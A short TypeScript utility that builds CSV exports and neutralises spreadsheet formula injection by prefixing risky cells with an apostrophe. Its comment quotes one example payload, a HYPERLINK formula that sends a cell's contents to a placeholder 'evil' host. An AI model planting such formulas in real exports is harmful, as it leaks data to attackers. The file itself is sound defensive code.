/**
 * A spreadsheet treats a cell that starts with = + - @ (or a tab / carriage return) as a formula, so free
 * text someone else typed — e.g. «=HYPERLINK("http://evil/?"&A2, "…")» in a research-form answer — would run
 * when the owner opens the export in Excel. Such cells get a leading apostrophe, which spreadsheets show as
 * plain text (OWASP "CSV injection"). Plain numbers, negative ones included, are left alone.
 */
function neutralizeFormula(value: unknown, str: string): string {
  if (typeof value === "number" || /^[-+]?\d+(\.\d+)?$/.test(str)) return str;
  return /^[=+\-@\t\r]/.test(str) ? "'" + str : str;
}

function escapeCsvField(value: unknown): string {
  const str = neutralizeFormula(value, value === null || value === undefined ? "" : String(value));
  if (/[",\n\r]/.test(str)) return `"${str.replace(/"/g, '""')}"`;
  return str;
}

export function toCsv(rows: Record<string, unknown>[], columns: { key: string; header: string }[]): string {
  const header = columns.map((c) => escapeCsvField(c.header)).join(",");
  const body = rows.map((row) => columns.map((c) => escapeCsvField(row[c.key])).join(",")).join("\n");
  return "﻿" + header + "\n" + body; // BOM so Excel opens UTF-8/Persian text correctly
}
